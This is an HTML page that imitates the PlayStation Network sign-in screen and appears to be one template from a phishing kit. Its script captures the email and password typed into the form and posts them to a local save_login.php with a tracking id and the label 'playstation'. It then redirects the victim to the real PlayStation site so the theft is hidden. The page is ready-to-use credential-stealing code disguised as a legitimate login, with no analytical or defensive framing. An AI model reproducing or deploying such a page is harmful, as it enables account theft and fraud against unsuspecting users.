<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PlayStation</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:SST Japanese,system-ui,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:420px;text-align:center}
.ps{color:#003791;font-size:22px;font-weight:700;letter-spacing:2px;margin-bottom:24px}
h1{font-size:18px;color:#1f1f1f;margin-bottom:24px}
input{width:100%;height:48px;border:1px solid #d9d9d9;border-radius:4px;padding:0 14px;margin-bottom:12px;font-size:15px}
.btn-submit{width:100%;height:48px;background:#003791;color:#fff;border:none;border-radius:4px;font-weight:700;cursor:pointer}
</style></head><body><div class="card"><div class="ps">PLAYSTATION</div><h1>Sign in to PlayStation Network</h1><form id="loginForm"><input type="text" id="email" placeholder="Sign-In ID (Email)" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign In</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
(function(){
var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    var login = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
    var btn = document.querySelector(".btn-submit");
    var label = btn.textContent;
    btn.textContent = "Please wait…";
    btn.disabled = true;
    $.ajax({
        type: "POST",
        url: BASE_URL + "save_login.php",
        data: { tid: tid, login: login, password: password, template: "playstation" },
        dataType: "json",
        success: function (data) {
            if (data && data.ok) { window.location.href = "https:\/\/my.playstation.com\/"; return; }
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        },
        error: function () {
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        }
    });
});
})();
</script></body></html>
